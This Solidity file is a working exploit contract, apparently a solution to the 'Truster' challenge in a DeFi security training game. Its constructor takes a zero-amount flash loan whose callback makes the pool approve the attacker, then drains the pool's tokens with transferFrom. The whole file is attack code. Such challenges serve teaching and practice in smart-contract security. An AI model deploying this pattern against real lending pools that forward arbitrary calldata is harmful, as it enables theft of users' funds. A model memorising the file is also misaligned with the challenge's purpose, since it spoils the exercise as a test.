pragma solidity ^0.8.0;

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
// Alternatively just import contract file
interface ITrusterLenderPool {
    function flashLoan(
        uint256 borrowAmount,
        address borrower,
        address target,
        bytes calldata data
    )
        external;
}

contract TrusterExploit {
    constructor(address poolAddress, address dvtAddress, uint256 amount) {
        // Init
        IERC20 DVT = IERC20(dvtAddress);
        ITrusterLenderPool pool = ITrusterLenderPool(poolAddress);
        // Actually there is no tokens loaned here, just execution of arbitrary function of arbitrary contract.
        pool.flashLoan(0, msg.sender, dvtAddress,
            abi.encodeWithSignature(
                "approve(address,uint256)",
                address(this),amount
                )
            );
        // After generous allowance from pool, only thing left to do is withdrawal.
        DVT.transferFrom(poolAddress, msg.sender, amount);
    }
}